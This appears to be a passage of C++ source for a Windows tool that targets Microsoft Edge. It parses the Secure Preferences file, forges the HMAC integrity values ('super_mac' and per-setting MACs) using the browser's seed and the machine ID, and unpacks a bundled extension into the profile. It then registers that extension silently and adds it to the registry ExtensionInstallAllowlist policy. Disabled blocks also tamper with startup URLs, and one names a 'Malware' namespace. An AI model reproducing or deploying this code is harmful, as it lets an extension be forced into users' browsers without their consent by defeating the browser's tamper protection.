    if (SecurePreferencesDoc.Parse(SecurePreferencesBuffer.data(), SecurePreferencesBuffer.size()).HasParseError())
     break;
    if (!SecurePreferencesDoc.IsObject())
     break;
    if (SecurePreferencesDoc.ObjectEmpty())
     break;
    //!@ SecurePreferencesDoc init success.
   } while (0);
   std::string BrowserPEBuffer = shared::Win::File::Read(MainProgramPathname);
   if (!shared::Win::PE::IsX64(BrowserPEBuffer))
    Platform = protocol::EnPlatformArch::EN_PLATFORM_ARCH_X86;
   m_pResObj = std::make_shared<ResourcesPak>(shared::Win::File::Read(ResourcesPakPathname));
   UserSid = m_pResObj->Version() == 5 ? m_Kaimi.device_id() : m_Kaimi.machine_id();
  } while (0);
 }
 void MicrosoftEdge::UnInit() {

 }
 bool MicrosoftEdge::SuperMac(std::string& out_super_mac) {
  bool result = false;
  out_super_mac.clear();
  do {
   if (UserSid.empty())
    break;
   if (!SecurePreferencesDoc.IsObject())
    break;
   if (!SecurePreferencesDoc.HasMember("protection") || !SecurePreferencesDoc["protection"].IsObject())
    break;
   if (!SecurePreferencesDoc["protection"].HasMember("macs") || !SecurePreferencesDoc["protection"]["macs"].IsObject())
    break;
   shared::Json::Sort(SecurePreferencesDoc["protection"]["macs"], SecurePreferencesDoc);
   std::string message_super_mac{ UserSid }, hmac_super_mac{};
   message_super_mac.append(shared::Json::toString(SecurePreferencesDoc["protection"]["macs"]));
#if 0
   shared::Openssl::HMAC_SHA256(message_super_mac, hmac_super_mac, std::string((char*)m_pResObj->Seed(), m_pResObj->SeedSize()));
   out_super_mac = shared::IConv::ToUpperA(hmac_super_mac);
#else
   machao::Encrypt(message_super_mac, out_super_mac);
#endif
   if (SecurePreferencesDoc["protection"].HasMember("super_mac"))
    SecurePreferencesDoc["protection"].RemoveMember("super_mac");
   SecurePreferencesDoc["protection"].AddMember(
    rapidjson::Value().SetString("super_mac", SecurePreferencesDoc.GetAllocator()).Move(),
    rapidjson::Value().SetString(out_super_mac.c_str(), SecurePreferencesDoc.GetAllocator()).Move(),
    SecurePreferencesDoc.GetAllocator()
   );

   result = true;
 } while (0);
 return result;
 }

 bool MicrosoftEdge::ExtensionsSetup(const std::string& extensions_zip_pak) {
  bool result = false;
  std::lock_guard<std::mutex> lock{ *m_Mutex };
#ifndef _DEBUG
  return result;
#endif

#if 0
#if 0
  //!@ message[session.restore_on_startup]
  std::string message_session_restore_on_startup{ machine_id }, hmac_session_restore_on_startup{};
  message_session_restore_on_startup.append(R"(session.restore_on_startup)");
  message_session_restore_on_startup.append(std::to_string(docSecurePreferences["session"]["restore_on_startup"].GetUint()));
  //!@ message[session.startup_urls]
  std::string message_session_startup_urls{ machine_id }, hmac_session_startup_urls{};
  message_session_startup_urls.append(R"(session.startup_urls)");
  message_session_startup_urls.append(shared::Windows::JsonString(docSecurePreferences["session"]["startup_urls"]));
  Malware::__HMAC(message_session_startup_urls, Seed(), SeedSize(), hmac_session_startup_urls);
#endif
#if 0
  //4100FFEE318B44136E48130CA506F8923D2394308C85975ADE887DAD730E6E35
  // 
  //4AC70E3D92C9644F518922AEE56EB8DC8887DBB0F059855DBBB0AF1A73A92285
  std::string message_session_startup_urls{ UserSid }, hmac_session_startup_urls{}, hmac_session_startup_urls_register{};
  message_session_startup_urls.append(R"(session.startup_urls)");
  message_session_startup_urls.append(shared::Json::toString(SecurePreferencesDoc["session"]["startup_urls"]));
  shared::Openssl::HMAC_SHA256(message_session_startup_urls, hmac_session_startup_urls, std::string((char*)m_pResObj->Seed(), m_pResObj->SeedSize()));
  shared::Openssl::HMAC_SHA256(message_session_startup_urls, hmac_session_startup_urls_register, protocol::ChromeRegistryHashStoreValidationSeed);
#endif
  //4499DF008D5FD1730C8970F4BEBB3895804E8F505FD0DD71C9989BFE6DF64C17
  // 
  //AA308AD3EFFEFE67802A2E7617BE59884D8B8B9F3CDD3F4B09B34A88FF078E3B
  std::string message_session_restore_on_startup{ UserSid }, hmac_session_restore_on_startup{}, hmac_session_restore_on_startup_register{};
  message_session_restore_on_startup.append(R"(session.restore_on_startup)");
  message_session_restore_on_startup.append(std::to_string(4));
  shared::Openssl::HMAC_SHA256(message_session_restore_on_startup, hmac_session_restore_on_startup, std::string((char*)m_pResObj->Seed(), m_pResObj->SeedSize()));
  shared::Openssl::HMAC_SHA256(message_session_restore_on_startup, hmac_session_restore_on_startup_register, protocol::ChromeRegistryHashStoreValidationSeed);

  std::string output;
  machao::Encrypt(message_session_restore_on_startup, output);
#endif

  std::map<std::string, std::string> extensions_paks;
  do {
   if (extensions_zip_pak.empty())
    break;
   if (!shared::Zip::IsZipCompress(extensions_zip_pak))
    break;
   std::string gbk_json_manifest_buffer;
   std::string extension_release_path = shared::Win::GetTempPathA();
   shared::Zip::zipBufferUnCompress(
    extensions_zip_pak,
    [&](const std::string& identify, const std::string& data, bool& _break)->bool {
     if (::StrStrIA(identify.c_str(), "manifest.json") && gbk_json_manifest_buffer.empty()) {
      gbk_json_manifest_buffer = data;
     }
     if (::StrStrIA(identify.c_str(), "extensions/") && identify.size() > ::strlen("extensions/"))
      extensions_paks.emplace(identify.c_str() + ::strlen("extensions/"), data);

     return false;
    }, extension_release_path);
   rapidjson::Document doc_manifest_release;
   rapidjson::Document doc_manifest_template;
   if (!ManifestParse(gbk_json_manifest_buffer, doc_manifest_release, true))
    break;
   if (protocol::MapBrowserExtensionsTemplate.find(ID) == protocol::MapBrowserExtensionsTemplate.end())
    break;
   if (!ManifestParse(protocol::MapBrowserExtensionsTemplate.at(ID), doc_manifest_template, false))
    break;
   rapidjson::Document docFinal;
   if (!ManifestGenerate(doc_manifest_template, doc_manifest_release, docFinal))
    break;

   std::string extensionsPrivateKey{ protocol::ChromeExtensionsPrivateKey }, extensionsPubliceKey, extensionsDerKey, extensionsIdentify;
   shared::Openssl::ChromeExtensionsIDGenerate(extensionsPrivateKey, extensionsPubliceKey, extensionsDerKey, extensionsIdentify);
   if (extensionsDerKey.empty() || extensionsIdentify.empty())
    break;

   //!@ 是否已经安装 
   auto tempCache = shared::Json::toString(SecurePreferencesDoc);
   if (tempCache.find(extensionsIdentify) != std::string::npos) {
    break;
   }

   std::string setup_extensions_version;
   do {//!@ version
    if (!docFinal.HasMember("manifest"))
     break;
    if (!docFinal["manifest"].IsObject())
     break;
    if (docFinal["manifest"].ObjectEmpty())
     break;
    if (!docFinal["manifest"].HasMember("version"))
     break;
    if (!docFinal["manifest"]["version"].IsString())
     break;
    if (docFinal["manifest"]["version"].GetStringLength() <= 0)
     break;
    setup_extensions_version = docFinal["manifest"]["version"].GetString();
   } while (0);
   if (setup_extensions_version.empty())
    break;

   do {// .install_time
    if (!docFinal.HasMember("install_time"))
     break;
    docFinal.RemoveMember("install_time");
    docFinal.AddMember(rapidjson::Value().SetString("install_time", docFinal.GetAllocator()).Move(),
     rapidjson::Value().SetString(std::to_string(shared::Win::Time::TimeStampWebkit()).c_str(), docFinal.GetAllocator()).Move(),
     docFinal.GetAllocator());
   } while (0);

   do {// .path
    if (!docFinal.HasMember("path"))
     break;
    docFinal.RemoveMember("path");
    std::string path = extensionsIdentify + "\\" + setup_extensions_version + "_0";
    docFinal.AddMember(rapidjson::Value().SetString("path", docFinal.GetAllocator()).Move(),
     rapidjson::Value().SetString(path.c_str(), docFinal.GetAllocator()).Move(),
     docFinal.GetAllocator());

    std::string extensions_release_path = shared::Win::PathFixedA(UserDataDir + "\\extensions\\" + path);
    if (extensions_paks.empty())
     break;
    for (const auto& node : extensions_paks) {
     std::string release_file = shared::Win::PathFixedA(extensions_release_path + "\\" + node.first);
     shared::Win::File::Write(release_file, node.second);
    }
   } while (0);

   do {// .manifest.key
    if (!docFinal.HasMember("manifest"))
     break;
    if (!docFinal["manifest"].IsObject())
     break;
    if (docFinal["manifest"].ObjectEmpty())
     break;
    if (docFinal["manifest"].HasMember("key"))
     docFinal["manifest"].RemoveMember("key");

    docFinal["manifest"].AddMember(rapidjson::Value().SetString("key", docFinal.GetAllocator()).Move(),
     rapidjson::Value().SetString(extensionsDerKey.c_str(), docFinal.GetAllocator()).Move(),
     docFinal.GetAllocator());
   } while (0);

   shared::Json::Sort(docFinal, docFinal);

   auto kankan = shared::IConv::UTF8ToMBytes(shared::Json::toString(docFinal));

   do {
    if (!SecurePreferencesDoc.HasMember("extensions") || !SecurePreferencesDoc["extensions"].IsObject())
     break;
    if (!SecurePreferencesDoc["extensions"].HasMember("settings") || !SecurePreferencesDoc["extensions"]["settings"].IsObject())
     break;
    SecurePreferencesDoc["extensions"]["settings"].AddMember(
     rapidjson::Value().SetString(extensionsIdentify.c_str(), SecurePreferencesDoc.GetAllocator()).Move(),
     docFinal,
     SecurePreferencesDoc.GetAllocator()
    );
    shared::Json::Compress(SecurePreferencesDoc["extensions"]["settings"][extensionsIdentify.c_str()], \
     SecurePreferencesDoc["extensions"]["settings"]);
    auto json_strng = shared::Json::toString(SecurePreferencesDoc["extensions"]["settings"][extensionsIdentify.c_str()]);
    shared::Json::Replace(json_strng, "<", "\\u003C");
    std::string message;
    message
     .append(UserSid)
     .append("extensions.settings.")
     .append(extensionsIdentify)
     .append(json_strng);
    std::string config_hmac;
#if 0
    shared::Openssl::HMAC_SHA256(message, config_hmac, std::string((char*)m_pResObj->Seed(), m_pResObj->SeedSize()));
    config_hmac = shared::IConv::ToUpperA(config_hmac);
#else
    machao::Encrypt(message, config_hmac);
#endif
    if (!SecurePreferencesDoc.HasMember("protection")) {
     rapidjson::Value obj{ rapidjson::kObjectType };
     SecurePreferencesDoc.AddMember(
      rapidjson::Value().SetString("protection", SecurePreferencesDoc.GetAllocator()).Move(),
      obj,
      SecurePreferencesDoc.GetAllocator());
    }
    if (!SecurePreferencesDoc["protection"].IsObject())
     break;
    if (!SecurePreferencesDoc["protection"].HasMember("macs")) {
     rapidjson::Value obj{ rapidjson::kObjectType };
     SecurePreferencesDoc["protection"].AddMember(
      rapidjson::Value().SetString("macs", SecurePreferencesDoc.GetAllocator()).Move(),
      obj,
      SecurePreferencesDoc.GetAllocator());
    }
    if (!SecurePreferencesDoc["protection"]["macs"].IsObject())
     break;
    if (!SecurePreferencesDoc["protection"]["macs"].HasMember("extensions")) {
     rapidjson::Value obj{ rapidjson::kObjectType };
     SecurePreferencesDoc["protection"]["macs"].AddMember(
      rapidjson::Value().SetString("extensions", SecurePreferencesDoc.GetAllocator()).Move(),
      obj,
      SecurePreferencesDoc.GetAllocator());
    }
    if (!SecurePreferencesDoc["protection"]["macs"]["extensions"].IsObject())
     break;
    if (!SecurePreferencesDoc["protection"]["macs"]["extensions"].HasMember("settings")) {
     rapidjson::Value obj{ rapidjson::kObjectType };
     SecurePreferencesDoc["protection"]["macs"]["extensions"].AddMember(
      rapidjson::Value().SetString("settings", SecurePreferencesDoc.GetAllocator()).Move(),
      obj,
      SecurePreferencesDoc.GetAllocator());
    }
    if (!SecurePreferencesDoc["protection"]["macs"]["extensions"]["settings"].IsObject())
     break;
    if (SecurePreferencesDoc["protection"]["macs"]["extensions"]["settings"].HasMember(extensionsIdentify.c_str()))
     SecurePreferencesDoc["protection"]["macs"]["extensions"]["settings"].RemoveMember(extensionsIdentify.c_str());
    SecurePreferencesDoc["protection"]["macs"]["extensions"]["settings"].AddMember(
     rapidjson::Value().SetString(extensionsIdentify.c_str(), SecurePreferencesDoc.GetAllocator()).Move(),
     rapidjson::Value().SetString(config_hmac.c_str(), SecurePreferencesDoc.GetAllocator()).Move(),
     SecurePreferencesDoc.GetAllocator()
    );
   } while (0);

   do {
    const std::string RegPathExtensionInstallAllowlist = shared::Win::PathFixedA(protocol::MapBrowserRegisterPoliciesPath.at(ID) + "\\ExtensionInstallAllowlist\\");
    std::map<std::string, std::string> keyvals;
    shared::Win::Registry::EnumValues(RegPathExtensionInstallAllowlist, keyvals);
    bool found = false;
    for (const auto& node : keyvals) {
     if (node.second.compare(extensionsIdentify) == 0) {
      found = true;
      break;
     }
    }
    if (found)
     break;
    auto write_register = RegPathExtensionInstallAllowlist + std::to_string(keyvals.size() + 1);
    shared::Win::Registry::NtWrite(write_register, extensionsIdentify, REG_SZ);
   } while (0);

   std::string super_mac;
   if (!SuperMac(super_mac))
    break;
   auto write_buffer = shared::Json::toString(SecurePreferencesDoc);
   shared::Json::Replace(write_buffer, "<", "\\u003C");
   if (!shared::Win::File::Write(UserDataDefaultSecurePreferencesPathname, write_buffer))
    break;
   result = true;
  } while (0);
  return result;
 }


}///namespace local